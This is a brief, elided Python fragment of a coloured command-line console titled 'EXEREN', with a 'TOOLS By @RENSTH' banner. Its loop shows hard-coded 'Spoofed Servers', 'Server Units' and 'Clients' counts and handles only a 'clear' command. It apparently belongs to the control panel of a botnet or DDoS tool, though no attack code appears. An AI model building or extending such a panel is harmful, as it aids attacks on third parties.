...
\033[36m                ╔═══════════════════════════════════════════════╗
\033[36m                ║\033[37m- - - - - - - TOOLS By \033[37m@RENSTH \033[37m- - - - - - -\033[36m ║
...
def main():
	...
	while True:
		...
		sys.stdout.write("\x1b]2;EXEREN | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[36m[\033[36m{}\033[37m@user\033[36m]\033[32m$ \033[36m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
